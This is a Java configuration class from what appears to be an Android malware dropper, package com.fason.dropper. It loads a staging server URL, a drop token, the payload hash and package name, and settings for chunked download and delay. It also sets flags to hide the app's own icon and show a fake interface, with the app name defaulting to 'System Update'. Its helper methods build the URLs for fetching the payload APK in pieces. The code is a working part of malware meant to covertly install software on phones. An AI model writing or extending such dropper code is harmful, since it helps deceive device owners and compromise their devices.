package com.fason.dropper;

import android.content.Context;

import java.io.InputStream;
import java.util.Properties;

public final class Config {
    public final String serverUrl;
    public final String token;
    public final String sha256;
    public final String salt;
    public final String secret;
    public final String payloadPkg;
    public final String appName;
    public final String homePageUrl;
    public final String mode;
    public final int chunks;
    public final int delayMs;
    public final long size;
    public final boolean hideSelf;
    public final boolean fakeUi;

    private Config(Properties p) {
        serverUrl = p.getProperty("server_url", "").trim();
        token = p.getProperty("drop_token", "").trim();
        sha256 = p.getProperty("payload_sha256", "").trim();
        salt = p.getProperty("salt", "").trim();
        secret = p.getProperty("device_secret", "").trim();
        payloadPkg = p.getProperty("payload_pkg", "com.fason.app").trim();
        appName = p.getProperty("app_name", "System Update").trim();
        homePageUrl = p.getProperty("home_page_url", "").trim();
        mode = p.getProperty("mode", "enc").trim();
        chunks = Integer.parseInt(p.getProperty("chunks", "0").trim());
        delayMs = Integer.parseInt(p.getProperty("delay_ms", "1500").trim());
        size = Long.parseLong(p.getProperty("payload_size", "0").trim());
        hideSelf = "1".equals(p.getProperty("hide_self", "1").trim());
        fakeUi = "1".equals(p.getProperty("fake_ui", "1").trim());
    }

    public static Config load(Context c) {
        Properties p = new Properties();
        try (InputStream in = c.getAssets().open("config.properties")) {
            p.load(in);
        } catch (Exception ignored) {
        }
        return new Config(p);
    }

    public String url(String path) {
        return serverUrl.replaceAll("/+$", "") + path;
    }

    public String manifestUrl() { return url("/api/drop/" + token + "/manifest"); }
    public String chunkUrl(int n) { return url("/api/drop/" + token + "/" + n); }
    public String apkUrl() { return url("/api/drop/" + token); }
}
